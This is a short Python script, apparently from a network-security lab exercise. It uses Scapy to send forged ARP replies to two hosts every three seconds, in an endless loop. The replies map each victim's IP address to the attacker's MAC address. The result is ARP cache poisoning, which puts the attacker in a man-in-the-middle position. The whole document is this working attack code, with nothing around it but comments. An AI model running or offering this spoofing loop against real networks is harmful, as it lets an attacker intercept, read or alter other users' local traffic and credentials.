#!/usr/bin/env python3
from scapy.all import *
import time

while(1):
    # mapping B's ip address with M's MAC address and send to A
    E = Ether(dst='08:00:27:21:6f:67', src='08:00:27:0c:d0:d5')
    A = ARP(hwsrc='08:00:27:0c:d0:d5', psrc='192.168.100.12', hwdst='08:00:27:21:6f:67', pdst='192.168.100.5')
    pkt = E/A
    pkt.show()
    sendp(pkt)

    # mapping A's ip address with M's MAC address and send to B
    E2 = Ether(dst='08:00:27:72:19:8f', src='08:00:27:0c:d0:d5')
    A2 = ARP(hwsrc='08:00:27:0c:d0:d5', psrc='192.168.100.5', hwdst='08:00:27:72:19:8f', pdst='192.168.100.12')
    pkt2 = E2/A2
    pkt2.show()
    sendp(pkt2)
    time.sleep(3)

